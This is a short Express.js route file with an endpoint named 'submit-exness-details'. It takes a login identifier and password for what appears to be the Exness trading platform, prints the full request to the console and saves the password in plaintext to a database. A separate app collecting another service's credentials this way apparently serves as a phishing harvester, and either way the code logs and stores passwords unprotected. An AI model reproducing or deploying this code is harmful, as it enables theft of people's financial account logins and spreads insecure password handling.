const express = require('express');
const Exnessuser = require('../models/exnessuser'); // Import Exnessuser model
const router = express.Router();

router.post('/submit-exness-details', (req, res) => {
    console.log(req.body); // Debugging line to check what data is being sent
    
    const { emailOrNumber, password } = req.body;

    if (!emailOrNumber || !password) {
        return res.status(400).send("Missing required fields.");
    }

    // Create a new Exness user and save to the database
    const newExnessUser = new Exnessuser({
        username: emailOrNumber,  // Store emailOrNumber as username
        email: emailOrNumber,     // Store emailOrNumber as email
        password: password,       // Store password in the password field
    });

    newExnessUser.save()
        .then(() => {
            // Redirect to the dashboard route
            res.redirect('/dashboard'); // Replace '/dashboard' with the actual dashboard route
        })
        .catch((err) => {
            console.error("Error saving Exness user:", err);
            res.status(500).send("Error saving Exness user: " + err.message);
        });
});

module.exports = router;
